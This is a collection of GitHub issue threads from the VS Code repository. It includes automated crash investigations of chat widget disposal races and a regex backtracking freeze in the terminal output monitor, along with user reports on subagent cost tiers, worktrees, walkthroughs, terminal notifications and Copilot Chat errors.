comments:
## Regression Details

- **Product**: Agents
- **Regression type**: New error
- **Last release without this error**: [1.115.0 (41dd792b)](https://errors.code.visualstudio.com/bucket/1a34f352-a2e8-1714-955d-0dd763ab3baa?product=Agents&commit=41dd792b5e652393e7787322889ed5fdc58bd75b)
- **First release with this error**: [1.116.0-insider (fc6d18c3)](https://errors.code.visualstudio.com/bucket/1a34f352-a2e8-1714-955d-0dd763ab3baa?product=Agents&commit=fc6d18c3174aa8962d90435aba5b51ef6c300b9a)
- **Commit range**: [41dd792b...fc6d18c3](https://github.com/microsoft/vscode/compare/41dd792b5e652393e7787322889ed5fdc58bd75b...fc6d18c3174aa8962d90435aba5b51ef6c300b9a)

### Deminified Stack (top frames)

1. `(anonymous)` — `src/vs/workbench/contrib/chat/browser/widget/chatWidget.ts:2575`
2. `_recompute` — `src/vs/base/common/observableInternal/observables/derivedImpl.ts:201`
3. `get` — `src/vs/base/common/observableInternal/observables/derivedImpl.ts:159`
4. `reportChanges` — `src/vs/base/common/observableInternal/observables/baseObservable.ts:45`
5. `endUpdate` — `src/vs/base/common/observableInternal/reactions/autorunImpl.ts:157`
6. ...
7. `_fn` — `src/vs/workbench/contrib/chat/common/tools/languageModelToolsService.ts:434`
8. `dispose` — `src/vs/base/common/lifecycle.ts:396`

The error occurs during observable recomputation in `chatWidget.ts` when accessing `currentModeObs` on an already-disposed object. The disposal is triggered by `languageModelToolsService.ts` cleaning up tool registrations, which cascades through observable updates. This is a disposal race condition — a derived observable reads a property that was nullified during cleanup. 24 users affected across Mac, Windows, Linux.

### Related Bucket

Bucket [`b0ec104e`](https://errors.code.visualstudio.com/bucket/b0ec104e-da9c-4a58-858c-ebcc65ff3967?product=Agents&commit=47add6dfa59e9d89115b53c74511f03db9575dd0) has the same error message and top frame (`chatWidget.ts:2575`) but a different trigger path (tool registration flush vs disposal). 14+ users on the same build.

> Generated by [errors-agents-regression-scan](https://github.com/microsoft/vscode-engineering/actions/runs/24355596020/agentic_workflow) · ● 6.5M · [◷](https://github.com/search?q=repo%3Amicrosoft%2Fvscode+%22gh-aw-workflow-call-id%3A+microsoft%2Fvscode-engineering%2Ferrors-agents-regression-scan%22&type=issues)

<!-- gh-aw-agentic-workflow: errors-agents-regression-scan, engine: copilot, model: claude-opus-4.6, id: 24355596020, workflow_id: errors-agents-regression-scan, run: https://github.com/microsoft/vscode-engineering/actions/runs/24355596020 -->
<!-- gh-aw-workflow-call-id: microsoft/vscode-engineering/errors-agents-regression-scan -->

## 🔍 Error Investigation ### Summary The error `Cannot read properties of undefined (reading 'currentModeObs')` occurs at `chatWidget.ts:2575` inside a `derived` observable (`scopedTools`) that is created by `getModeRequestOptions()` and passed to the chat service. When MCP tools are unregistered (e.g., due to a workspace folder change removing an MCP server), the observable re-evaluates on an already-disposed `ChatWidget`, where `this.input` returns `undefined` because `inputPartDisposable` has been cleared. This is a use-after-dispose race condition affecting 24+ users across all platforms in the Agents product. ### Culprit Commit No single culprit commit could be definitively identified. The `scopedTools` derived observable was introduced in PR #301381 (1.112.0, by `@roblourens`) and the autorun that keeps it subscribed in `chatServiceImpl.ts:1227-1239` was part of the same PR. The bug is latent — it surfaces when a `ChatWidget` is disposed while the chat service still holds an active subscription to `scopedTools` via the autorun, and an MCP tool change triggers re-evaluation. Possible triggers within the regression range (`41dd792b..fc6d18c3`) include: - [`bda49a1b`](https://github.com/microsoft/vscode/commit/bda49a1b) — Enabled `chat.customizations.providerApi.enabled` by default, potentially activating new MCP tool management code paths - Multiple sessions/workspace management changes that could alter widget disposal timing relative to MCP server lifecycle ### Code Flow ```mermaid sequenceDiagram participant WF as WorkspaceFolders participant MCP as McpWorkbenchService participant Contrib as McpLMToolContribution participant ToolSvc as LanguageModelToolsService participant ChatSvc as ChatServiceImpl (autorun) participant Widget as ChatWidget (disposed) WF->>MCP: onDidChangeWorkspaceFolders MCP->>MCP: removeWorkspaceService MCP->>Contrib: onDidUninstallMcpServer → sync() Note over Contrib: collection is null →
tools.forEach(t ⇒ t.store.dispose()) Contrib->>ToolSvc: _tools.delete(data) [line 434] Note over ToolSvc: ⚠️ Observable set change
propagates through dependency graph ToolSvc->>ChatSvc: autorun triggered [line 1227] ChatSvc->>Widget: scopedTools derived recomputes Note over Widget: 💥 this.input is undefined
(inputPartDisposable cleared)
Cannot read 'currentModeObs' ``` ### Affected Files | File | Role | |------|------| | `src/vs/workbench/contrib/chat/browser/widget/chatWidget.ts` | **Crash site** — `scopedTools` derived at line 2575 accesses `this.input.currentModeObs` without null check | | `src/vs/workbench/contrib/chat/common/chatService/chatServiceImpl.ts` | **Subscription holder** — autorun at line 1227 keeps `scopedTools` subscribed after widget disposal | | `src/vs/workbench/contrib/chat/browser/widget/input/chatSelectedTools.ts` | **Data flow** — `userSelectedTools` derived depends on tool registry | | `src/vs/workbench/contrib/chat/common/tools/languageModelToolsService.ts` | **Data flow** — `_tools.delete()` at line 434 triggers observable propagation | | `src/vs/workbench/contrib/mcp/common/mcpLanguageModelToolContribution.ts` | **Trigger** — autorun at line 112 disposes tool stores when MCP server is removed | ### Repro Steps 1. Open VS Code Agents with a multi-folder workspace that has MCP servers configured 2. Start a chat session and send a request (this creates `scopedTools` via `getModeRequestOptions()`) 3. While the request is active (or the service still holds the autorun), change workspace folders (e.g., remove a folder that has an MCP server configured) 4. The MCP server uninstall triggers tool disposal, cascading through observables to the `scopedTools` derived on the disposed widget 5. Error is non-deterministic — requires the widget to be disposed (e.g., navigated away from) while the service still holds the autorun subscription ### Fix Proposal **Fix location**: `src/vs/workbench/contrib/chat/browser/widget/chatWidget.ts` → `getModeRequestOptions()`, the `scopedTools` derived computation **Approach**: Add a guard clause at the top of the `scopedTools` derived computation (line 2573-2582) to check whether `this.input` is still available before accessing `currentModeObs`. If `this.input` is `undefined` (widget disposed), return `lastToolsSnapshot` immediately. This prevents the crash while preserving the last known tools state: ```typescript const scopedTools = derived(reader => { const input = this.input; // ← add null check if (!input) { return lastToolsSnapshot; } const activeSession = this._viewModelObs.read(reader)?.sessionResource; const currentModeId = input.currentModeObs.read(reader).id; // ... rest unchanged }); ``` Additionally, consider disposing the autorun in `chatServiceImpl.ts:1227` when the widget is disposed, so the `scopedTools` derived is no longer subscribed. ### Recommended Owner `@roblourens` — author of the `scopedTools` derived observable (PR #301381) and primary maintainer of the chat widget + chat service request flow. The fix is in `chatWidget.ts` which is core chat widget infrastructure. > Generated by [errors-investigate](https://github.com/microsoft/vscode-engineering/actions/runs/24356848920/agentic_workflow) · ● 15.7M · [◷](https://github.com/search?q=repo%3Amicrosoft%2Fvscode+%22gh-aw-workflow-call-id%3A+microsoft%2Fvscode-engineering%2Ferrors-investigate%22&type=issues)

Same crash site: `chatWidget.ts:2562` → `derivedImpl.ts:201`. 11 users, 16 hits on stable. The insiders-released fix has not yet reached stable.

title: Custom agents should be allowed to exceed the current cost tier
description:
Testing #309322

When invoking a custom subagent that has a model specified in its definition, and that model exceeds the current cost tier, it should still be allowed to run.

Currently it will fail with `Requested model '___' exceeds the current model's cost tier`. But since the agent is user defined, it should be able to succeed (at least with user approval).
comments:
Real-world use case: orchestrator agent deliberately choosing a lower-cost model while routing to higher-cost specialists

We maintain a multi-agent "Dream Team" workflow where a central orchestrator agent (ProductVisionary) manages the lifecycle of a GitHub issue from intake through specification, implementation, review, and CI. The orchestrator reads the issue, classifies the work, and hands off to specialist agents — each configured with the model best suited for their domain:

ProductVisionary (orchestrator): GPT-5.4 — chosen for its reasoning style during product classification and workflow routing, not for cost savings  
SpecificationLead: Claude Opus 4.6 — chosen for deep specification writing  
SecurityEngineer: Claude Opus 4.6 — chosen for thorough security analysis  
TechLead: Claude Sonnet 4.6 — chosen for implementation work  
Other review agents on Sonnet or Haiku tiers as appropriate

The current cost-tier restriction forces us to either:

Move the orchestrator to Opus — losing the model we actually prefer for orchestration work, or  
Downgrade specialist agents to Sonnet — losing the capability we specifically chose for domain-critical tasks like specification writing and security review

Neither option reflects our intent. We're not trying to avoid cost. We're trying to pick the right model for each job. The orchestrator doesn't need Opus-level capability — it reads an issue, makes a routing decision, and verifies that the previous agent committed its work. The specialists do need their configured models for the quality of output they produce.

What we'd like: A way to explicitly opt in to allowing subagents to use higher-cost models than the parent session, preferably through a setting rather than a one-time permission prompt. The key is that the decision should be ours, not a hard block. Something like `chat.subagents.allowHigherCostModels` would fit this use case well.

Environment: VS Code with custom `.agent.md` files using `model:` frontmatter and `handoffs:` for agent-to-agent transitions, plus `runSubagent` for programmatic delegation.

title: Allow more expensive models in subagents (with user approval)
description:
Testing #309322

Not exceeding the current cost tier is a good precaution -- but in some cases it's useful; e.g. running a subagent with a large context window to scan a large number of files and report a summary.

It might be nice if, when requesting a subagent with a more expensive model, the user can choose to approve or deny (or default to deny in e.g. autopilot mode)
comments:
### Better suggestion
Make the main request cost the highest premium request factor in the tree of subagents.

### Examples
1. GPT-5.4 Agent (1x) -> Opus 4.6 Subagent (3x) = 3x premium requests
2. GPT-5.4-mini Agent (0.33x) -> Opus 4.6 Subagent (3x) -> GPT-5.4 Subagent (1x) = 3x premium requests

This can be automatic imo then, too, since the user has to explicitly configure this, so the higher cost can be expected.

title: `Failed to create worktree. Proceeding without isolation.`
description: Testing #309111 Not directly related to the feature I was testing, but I found this message while starting a new session (see screenshot below). This occurred after I had the worktree copy over changes to it (20+ files). In a scenario like this, I'd like the option to try to resolve this, or even try creating the worktree without bringing over the diff, as I did not want to work in the main repo.
comments:
Thanks for reporting this - I haven't encountered this in self-hosting before. 

> In a scenario like this, I'd like the option to try to resolve this, or even try creating the worktree without bringing over the diff, as I did not want to work in the main repo.

This makes sense to me.

> This occurred after I had the worktree copy over changes to it (20+ files).

Did you only repro this when working on this specific repo and trying to copy over the 20+ file changes? I'm generally curious about the state that led to worktree creation failure and how often you've experienced this (I'm guessing it was maybe due to the size or other specifics of the changes).

I encountered this for the first time today, while asking a question about the VS Code codebase (in the microsoft/vscode repo).

I tried creating a fresh new session and asking the same exact question, and it worked the second time (the worktree was created and used for the session).

> Did you only repro this when working on this specific repo and trying to copy over the 20+ file changes

The 20+ file changes is the only scenario I've seen this happen thankfully 🙏

title: Content is minimal
description:
Testing #309099

I like that this walkthrough feels lightweight. However, I feel that it is missing improtant content for beginner users that our current walkthroughs have. 

In particular, I think it's important to indicate how to access settings and customize keyboard shortcuts. Do we have telemetry on which of our waklthrough steps are most beneficial / interacted with that could help here?
comments:
This is the current first open walkthrough so this one should cover everything here + a little more! 

![Image](https://github.com/user-attachments/assets/e7ff64e8-af34-45c6-af49-16d63ae951c4)

We cut down this walkthrough significantly due to feedback from user interviews and data. Most users drop off after 3 steps, many not acting on the information they see. Many users felt things like settings/keybindings and sometimes even extensions was too much up front because they "didn't know what they needed" at this point in time.

For me, that was not open after I completed the initial walkthrough. I just saw the standard welcome page. Makes sense that users drop off quickly. I wonder about including links to open settings/keyboard shortcuts just on one of the minimal pages we have in the new one would be a good idea, under a header like "Customizations", with their keybindings, for those that want them.

>For me, that was not open after I completed the initial walkthrough

Sorry to clarify, the screenshot I put above is the current walkthrough that this new experience is replacing so it is expected you wouldn't see it after.

title: Testing: Confirmation carousel focus outline hidden
description: Testing #309330 If you tab through the new confirmation carousel UI you'll reach a tab location where the focus outline is rendered beneath the tool call info section. The bottom corners of the carousel also clip the focus outline. Focus outline should be above everything.
comments: Oh check other themes too cause some to have even worse rendering/clipping happening

title: Pasting image clipboard data into terminal-based LLM input does nothing in Parallels/Windows
description:
<!-- ⚠️⚠️ Do Not Delete This! bug_report_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- 🕮 Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->
<!-- 🔎 Search existing issues to avoid creating duplicates. -->
<!-- 🧪 Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->
<!-- 💡 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->
<!-- 🔧 Launch with `code --disable-extensions` to check. -->
Does this issue occur when all extensions are disabled?: No

<!-- 🪓 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->
<!-- 📣 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->
- VS Code Version: 1.115.0
- OS Version: Windows 11

Steps to Reproduce:

1. On macOS host, take a screenshot, not to file, just to clipboard
2. In a Windows VM running under Parallels, open VS Code.
3. Open the integrated terminal and start/use Claude Code in the terminal (or codex)
4. Try to paste the copied screenshot into the LLM terminal input.
5. Notice that nothing is pasted and there is no visible feedback.
6. In the same VM/session, paste the same clipboard contents into apps such as MSPaint or VS Code chat/copilot-style extension inputs.
7. Notice that the image pastes successfully in those places.

Expected Result:
Pasting image clipboard contents into the terminal-based Claude Code workflow should either:
- work,
- convert the image into an attachment or file reference,
- or show a clear message that image clipboard paste is not supported.

Actual Result:
Nothing appears to paste into the terminal / Claude Code input, with no clear error or feedback.

Additional Notes:
- This appears specific to terminal-based input.
- The same clipboard image can be pasted successfully into GUI applications like MSPaint and chat-style VS Code extension inputs.
- The environment uses macOS as host and Windows in Parallels, so clipboard format conversion between host and guest may be involved.
- It is unclear whether this is a VS Code terminal issue, a limitation of terminal paste behavior, a Parallels clipboard interoperability issue, or an issue in Claude Code specifically.
comments: Thanks for the issue. Bc there are so many variables you mentioned, it would be best if you narrowed this down - can you try pasting in parallels in a terminal outside of vscode in claude and let us know if it reproduces there? closing for now.

title: [Unhandled Error] Uncaught TypeError: Cannot read properties of undefined (reading 'getRequests')

- **First release with this error**: [1.116.0-insider (`e4f6e114`)](https://errors.code.visualstudio.com/bucket/251f9e99-cfcd-b2c7-d870-311951881120?product=VSCode&commit=e4f6e1148528f4e6fba4bf58e4a5f28539135156)
- **Commit range**: [fc6d18c3...e4f6e114](https://github.com/microsoft/vscode/compare/fc6d18c3174aa8962d90435aba5b51ef6c300b9a...e4f6e1148528f4e6fba4bf58e4a5f28539135156)
- **Trend**: Increasing — 23 users on first bad build, 262 users on latest

### Deminified Stack

```
at (anonymous) (chatModel.ts:1061)           ← getRequests called on undefined
at (anonymous) (chatEditingSession.ts:1039)  ← modelId getter
at (anonymous) (chatEditingModifiedFileEntry.ts:299)  ← _notifyAction
at (anonymous) (chatEditingModifiedFileEntry.ts:272)  ← _notifySessionAction
at (anonymous) (chatEditingModifiedFileEntry.ts:101)  ← throttled runner
at (anonymous) (async.ts:1172)               ← Throttler.doRun
at (anonymous) (async.ts:1167)               ← Throttler.onTimeout
```

### Related

A similar error (same message, different stack path through `chatEditingModifiedDocumentEntry.ts`) was filed as #309130 for the Agents product and fixed. This VSCode bucket enters through `chatEditingModifiedFileEntry.ts` instead, suggesting the fix didn't cover this code path.

> Generated by [errors-regression-scan](https://github.com/microsoft/vscode-engineering/actions/runs/24354443170/agentic_workflow) · ● 12.1M · [◷](https://github.com/search?q=repo%3Amicrosoft%2Fvscode+%22gh-aw-workflow-call-id%3A+microsoft%2Fvscode-engineering%2Ferrors-regression-scan%22&type=issues)

<!-- gh-aw-agentic-workflow: errors-regression-scan, engine: copilot, model: claude-opus-4.6, id: 24354443170, workflow_id: errors-regression-scan, run: https://github.com/microsoft/vscode-engineering/actions/runs/24354443170 -->
<!-- gh-aw-workflow-call-id: microsoft/vscode-engineering/errors-regression-scan -->

## 🔍 Error Investigation ### Summary The error `Cannot read properties of undefined (reading 'getRequests')` occurs when `ChatResponseModel._session` is `undefined` after disposal. A throttled scheduler in `chatEditingModifiedFileEntry.ts` fires up to 1 second after user edits, calling `_notifySessionAction` → `_notifyAction`, which accesses `telemetryInfo.modelId`. This lazy getter calls `responseModel.request`, which does `this.session.getRequests()` — but `session` is `undefined` because `ChatResponseModel.dispose()` cleared `_session`. This is the **same root cause** as #309130 (which entered through `chatEditingModifiedDocumentEntry.ts`), and was **already fixed** by PR #309093. ### Culprit Commit | Field | Value | |-------|-------| | Commit | [`7c7259ff`](https://github.com/microsoft/vscode/commit/7c7259ff50bc50689c167874b24fce9b5e698501) | | Author | `@roblourens` | | PR | #308638 | | Message | pref: Break references at disposal to limit the impact of leaks | | Why | This commit added `this._session = undefined!` in `ChatResponseModel.dispose()` to break GC retention cycles. However, the `_telemetryInfo` object created by `_getTelemetryInfoForModel` holds lazy getters that close over the `responseModel` and access `responseModel.session` after disposal — specifically when the 1-second `_userEditScheduler` fires. | ### Code Flow ```mermaid sequenceDiagram participant User as User Edit participant Scheduler as RunOnceScheduler (1s) participant Entry as ModifiedFileEntry participant TelInfo as TelemetryInfo (lazy getters) participant Response as ChatResponseModel participant ChatModel as ChatModel User->>Scheduler: User modifies file Note over ChatModel: ⚠️ Session disposed ChatModel->>Response: dispose() Note over Response: _session = undefined! Scheduler->>Entry: _notifySessionAction('userModified') Entry->>Entry: _notifyAction() Entry->>TelInfo: this._telemetryInfo.modelId TelInfo->>Response: responseModel.request Response->>Response: this.session.getRequests() Note over Response: 💥 session is undefined
Cannot read 'getRequests' ``` ### Affected Files | File | Role | |------|------| | `src/vs/workbench/contrib/chat/common/model/chatModel.ts` | Root cause — `ChatResponseModel.dispose()` nullified `_session` (lines 1431-1437 in original, reverted by #309093) | | `src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingModifiedFileEntry.ts:101` | Trigger — 1s throttled `_userEditScheduler` fires after disposal | | `src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingModifiedFileEntry.ts:299` | Crash site — `_notifyAction` accesses `this._telemetryInfo.modelId` | | `src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSession.ts:1035-1055` | Data flow — `_getTelemetryInfoForModel` creates lazy getters that close over `responseModel` | ### Repro Steps 1. Open VS Code Insiders (builds `e4f6e114` through `47add6df`, before fix #309093) 2. Start a chat editing session that produces file modifications 3. After the agent finishes editing, manually edit the modified file (to trigger `_userEditScheduler`) 4. Close/dispose the chat session while the 1-second scheduler is pending 5. The scheduler fires after disposal, accessing `responseModel.session` which is now `undefined` The error is timing-dependent — the session must be disposed during the 1-second window between the user edit and the scheduler firing. ### Fix Proposal **Already fixed** by PR #309093 ("Don't remove model ref on disposal"), merged Apr 10. The fix reverted `this._session = undefined!` from `ChatResponseModel.dispose()`, keeping the `_session` reference intact after disposal. The PR description notes: _"Too risky, chat model lifecycle is too confusing and there are still some references to do things like check the URI after it's disposed."_ All 5 affected builds in the error bucket predate the fix: - `e4f6e114` (Apr 9), `0271b4d2` (Apr 9), `1ec46de1` (Apr 9), `a4f51197` (Apr 10), `47add6df` (Apr 10 11:25 UTC) - Fix merged: Apr 10 20:02 UTC No error hits appear on builds after the fix. **This issue should self-resolve as users update to newer Insider builds.** ### Recommended Owner `@roblourens` — culprit commit author who already fixed the issue via #309093. Consider closing this issue as a duplicate of #309130. > Generated by [errors-investigate](https://github.com/microsoft/vscode-engineering/actions/runs/24355552373/agentic_workflow) · ● 7.3M · [◷](https://github.com/search?q=repo%3Amicrosoft%2Fvscode+%22gh-aw-workflow-call-id%3A+microsoft%2Fvscode-engineering%2Ferrors-investigate%22&type=issues)

comments:
## Regression Details

- **Product**: VSCode
- **Regression type**: Spike (11.5x increase)
- **Spike factor**: 11.5x (2 → 23 users)
- **Last release without spike**: [1.116.0-insider](https://errors.code.visualstudio.com/bucket/871f307b-9f6c-553d-47d9-654f91256c5e?product=VSCode&commit=a4f5119796984330f866b3dd6b2ce0694ff5c814) (2 users)
- **First release with spike**: [1.116.0-insider](https://errors.code.visualstudio.com/bucket/871f307b-9f6c-553d-47d9-654f91256c5e?product=VSCode&commit=47add6dfa59e9d89115b53c74511f03db9575dd0) (23 users)
- **Commit range**: [a4f51197...47add6df](https://github.com/microsoft/vscode/compare/a4f5119796984330f866b3dd6b2ce0694ff5c814...47add6dfa59e9d89115b53c74511f03db9575dd0)

### Deminified Stack

```
at (anonymous) (outputMonitor.ts:492)
at (anonymous) (outputMonitor.ts:492)
at detectsInputRequiredPattern (outputMonitor.ts:300)
at (anonymous) (outputMonitor.ts:156)
```

The `UnresponsiveSampleError` indicates the renderer became unresponsive while executing `detectsInputRequiredPattern` in `outputMonitor.ts`. This function uses `RegExp.test()` which may be experiencing catastrophic backtracking on certain terminal output patterns. The spike from 2→23 users between consecutive insider builds suggests a change in this commit range triggered the issue more frequently.

> Generated by [errors-regression-scan](https://github.com/microsoft/vscode-engineering/actions/runs/24354443170/agentic_workflow) · ● 12.1M · [◷](https://github.com/search?q=repo%3Amicrosoft%2Fvscode+%22gh-aw-workflow-call-id%3A+microsoft%2Fvscode-engineering%2Ferrors-regression-scan%22&type=issues)

<!-- gh-aw-agentic-workflow: errors-regression-scan, engine: copilot, model: claude-opus-4.6, id: 24354443170, workflow_id: errors-regression-scan, run: https://github.com/microsoft/vscode-engineering/actions/runs/24354443170 -->
<!-- gh-aw-workflow-call-id: microsoft/vscode-engineering/errors-regression-scan -->

## 🔍 Error Investigation ### Summary The `UnresponsiveSampleError` is caused by **catastrophic regex backtracking** (ReDoS) in the `detectsInputRequiredPattern()` function in `outputMonitor.ts`. When the terminal output monitor polls for input-required patterns, the PowerShell prompt detection regex (line 472) exhibits O(n2) backtracking on terminal output containing a `[X]`-style prefix followed by a long sequence of whitespace mixed with non-whitespace characters. This freezes the renderer process, triggering VS Code's unresponsive window detector. The regression was introduced in PR #308587, which removed the `_lastPromptMarker` that previously bounded the input to the regex — the function now evaluates the **entire terminal output buffer** instead of just the content since the last prompt. ### Culprit Commit | Field | Value | |-------|-------| | Commit | PR merge (squash) from [`e6fe46e`](https://github.com/microsoft/vscode/commit/e6fe46e23b64d93da874b5c405b20057ad8b700d) | | Author | `@meganrogge` | | PR | #308587 | | Message | remove LLM calls to detect prompts for input, add fg terminal support | | Why | Removed `_lastPromptMarker` from `getOutput()` call, so regex patterns now run against the **entire** terminal output buffer instead of just new content since the last prompt. Additionally, `detectsInputRequiredPattern()` is now called in **both** foreground and async modes (previously only async). | ### Code Flow ```mermaid sequenceDiagram participant SM as _startMonitoring participant IH as _handleIdleState participant DI as detectsInputRequiredPattern participant RE as RegExp.test() SM->>IH: state = Idle (line 156) IH->>IH: output = execution.getOutput() Note over IH: ⚠️ Root cause: getOutput()
returns ENTIRE terminal buffer
(no marker passed since PR #308587) IH->>DI: detectsInputRequiredPattern(output) DI->>RE: PowerShell regex.test(output) Note over RE: 💥 O(n2) backtracking on
regex with overlapping
[^\[]*\s* + \s+$ quantifiers
→ UnresponsiveSampleError ``` ### Affected Files | File | Role | |------|------| | `src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts` | Crash site (line 492) and root cause (line 251: `getOutput()` without marker; line 472: vulnerable regex) | ### Repro Steps 1. Open VS Code Insiders (1.116.0) 2. Start a terminal session via chat agent tools (run a command using `run_in_terminal`) 3. Run a command that produces output containing a bracketed pattern like `[A]` followed by a long string (1000+ characters) with mixed whitespace and non-whitespace — e.g., structured .NET logs, build output with progress indicators, or pager output 4. Wait for the output monitor to enter idle state and call `detectsInputRequiredPattern()` 5. The renderer process freezes for several seconds, triggering `UnresponsiveSampleError` The issue is more likely with longer terminal sessions that accumulate large output buffers, since the regex now runs against the entire buffer on every idle check. ### Fix Proposal There are two complementary fixes needed: **Fix 1 — Bound the regex input** (primary fix): `outputMonitor.ts` → `_handleIdleState()` and `_waitForIdle()` Extract only the **last line** (cursor line) from the terminal output before passing it to `detectsInputRequiredPattern()`, since the function's parameter is named `cursorLine` and all regexes use `$` anchoring. For example: `const cursorLine = output.trimEnd().split(/\r?\n/).pop() ?? '';`. This restores the intent of matching only the current prompt line, not the entire buffer. **Fix 2 — Fix the regex itself** (defense in depth): `outputMonitor.ts` → `detectsInputRequiredPattern()`, line 472 The PowerShell regex `/\s*(?:\[[^\]]\]\s+[^\[\s][^\[]*\s*)+(?:\(default is\s+"[^"]+"\):)?\s+$/` has overlapping quantifiers between `[^\[]*`, `\s*` (inside the group), and `\s+$` (outside). Fix by making `[^\[]*` exclude whitespace at its end boundary, e.g., use an atomic-style approach or restructure as `/\s*(?:\[[^\]]\]\s+[^\[\s]\S*\s*)+(?:\(default is\s+"[^"]+"\):)?\s+$/` (restrict content to `\S*` non-whitespace after the first char). Note: A previous ReDoS in this same regex was fixed in PR #279853 (Dec 2025), but the fix was incomplete — it eliminated one source of ambiguity (`[^\[]+` → `[^\[\s][^\[]*`) but left the `[^\[]*\s*` + `\s+$` overlap. ### Recommended Owner `@meganrogge` — PR #308587 author and terminal agent tools area owner > Generated by [errors-investigate](https://github.com/microsoft/vscode-engineering/actions/runs/24355457245/agentic_workflow) · ● 19.8M · [◷](https://github.com/search?q=repo%3Amicrosoft%2Fvscode+%22gh-aw-workflow-call-id%3A+microsoft%2Fvscode-engineering%2Ferrors-investigate%22&type=issues)

title: `chat.tools.terminal.backgroundNotifications: false` still fires completion notifications for foreground terminals
description:
Testing #309095 (section 1, Windows).

### What I expected
With `chat.tools.terminal.backgroundNotifications: false`, the agent should *not* receive automatic terminal-completion notifications. This is reflected in the fact that the per-call runtime instruction block drops the sentence *"You will be automatically notified on your next turn when it completes"* in this mode.

### What actually happened
Even with `chat.tools.terminal.backgroundNotifications: false`, completion notifications **still fired automatically** for foreground sync-mode terminals that had exceeded their initial timeout. Observed with two separate commands during the same session, both of which produced the full `[Terminal <id> notification: command completed with exit code 0 ...]` tail on the next agent turn with no polling:

1. `cargo check` foreground, sync mode, short initial timeout. Notification fired on its own when the build finished.
2. `pwsh -NoProfile -File ./scripts/test-prompt.ps1` foreground, sync mode. Notification fired on its own after the script exited.

So either:
- the setting only gates *input-waiting* notifications (not completion notifications) and the docs / runtime note are misleading, **or**
- completion notifications are not honoring the setting.

### Steps to reproduce (Windows, Nectarine / default agent, agent mode)
1. Set `chat.tools.terminal.backgroundNotifications` to `false` in workspace settings.
2. Ask the agent to run a long-running foreground command (e.g. `cargo check` on a non-trivial Rust workspace, or any compile that takes ≥30s) with a short initial timeout so the tool returns while the command is still running.
3. Do **not** poll `get_terminal_output`. Continue the conversation with an unrelated step.
4. Observe: when the foreground command eventually finishes, an automatic `[Terminal ... notification: command completed ...]` chunk is injected on the next agent turn anyway.

### Impact
Low-to-medium: it means the setting's off-state is not fully off — users who turn background notifications off because they find them noisy will still get completion-notification chatter. It also makes it harder to deterministically test the difference between the two setting values.

### Environment
- OS: Windows
- VS Code Insiders, agent mode, `Nectarine` model
- Repo under test: microsoft/python-environment-tools (Rust workspace, long build)

cc @meganrogge
comments: /closedWith ece8fd034b6be7b7868ae1992fc6cac4129fe2d0

title: Github Copilot Chat 0.43.0 fails to download - VSCode and manual.
description: - Copilot Chat Extension Version: 0.43.0 - VS Code Version: 1.115.0 - OS Version: Windows 11 23H2 (22631.6783) - Feature (e.g. agent/edit/ask mode): Installing - Selected model (e.g. GPT 4.1, Claude 3.7 Sonnet): N/A - Logs: This appears to be an odd issue in the Github Copilot Chat extension deployment layer, where either the uploaded file was incomplete / corrupt, or there is some connectivity issue with the host. Steps to Reproduce: 1. With VSCode 1.115.0 and the Github Copilot Chat extension v0.42.3 installed, and the extension set to automatically update, close and re-launch VSCode. 2. It begins installing v0.43.0 of the extension, but it fails with an error. Sometimes it does this quickly, usually it takes several minutes before it times out and gives up on the download. comments:
We're gonna be shipping GitHub Copilot Chat in box with VS Code now. The next version released this week will have it in-box. You can try this out today using the [Insiders version](https://code.visualstudio.com/insiders/)

You shouldn't hit this issue at all in the new version coming out this week.
Great decision, but what to do for those who are stuck with non working version and do not have access to the newest verision behind corporate firewall?

Follow-up - For me, today, VSCode 1.116.0 dropped.  I am not an insider, and I think I would prefer not to be, at least most of the time.  So I guess I'll probably need to wait another week or two for 1.117.0 and use the workaround in (4) for now.

Edit - After installing 1.116.0, based on the fact that Github Copilot Chat no longer appears in my list of installed extensions, I guess this is actually in 1.116.0.

description:
<!-- Please search existing issues to avoid creating duplicates -->
<!-- Please attach logs to help us diagnose your issue -->

https://x.com/pierceboggan/status/2037560776505073839?s=20

Failed to upload "copilot_all_prompts_2026-04-13T15-58-52.json" 

I can share a google drive link?

- Copilot Chat Extension Version: (where do I find this?)
- VS Code Version: 1.115.0
- OS Version: Windows 11 25H2
- Feature (e.g. agent/edit/ask mode): Agent
- Selected model (e.g. GPT 4.1, Claude 3.7 Sonnet): GPT 5.3 Codex
- Logs: 

Sorry, your request failed. Please try again.

Copilot Request id: 29580d0a-83e5-4d87-8eec-77973291c675

GH Request Id: F054:127C2A:71A6D85:84F0859:69DD1042

Reason: Request Failed: 413 {"error":{"message":"failed to parse request","code":""}}

Steps to Reproduce:

1. Work together with the agent on ipynb files.
2. Ask it to gether the results (including pictures in output) 
3. Once it grabs those and tries to answer it gives the following answer from the logs above

I can give you the whole chat debug view with an external link maybe or over email? the file is too big to place here on github.
comments:
This likely root cause of the error is overpopulating of chat request with images in BASE64 format, which has been fixed in this PR: https://github.com/microsoft/vscode/pull/308901.

The fix is available in latest VS Code **Insiders** and **Stable** version **1.116** and beyond.
Please update to this (or later) version and verify if the issue is resolved.

If you still can reproduce the error with **413 response** code in chat, please ping me with the following information:
- VS Code version your are running
- What language model/version are you using?
- What was the chat doing immediately before it responded with the error?
- If there were images the chat was inspecting, how many were there and what were their sizes?

title: Should giving input to the terminal automatically include output after some delay
description:
Testing #309095

There's a long sequence of interaction in https://github.com/microsoft/vscode/issues/309506#issue-4256232160

I wonder if we should automatically include the model terminal output after some brief period of time as part of the "give input" tool, instead of having to go back and do another full agent turn
comments: Yes, I also wondered this. However, since "some period of time" is very hard to get right, I think letting it call the tool is better.

After investigating, I realized we should not be instructing the agent to call `get_terminal_output` unless it's a subagent (which lacks notifications). That's needless and wastes tokens as it returns the whole buffer.
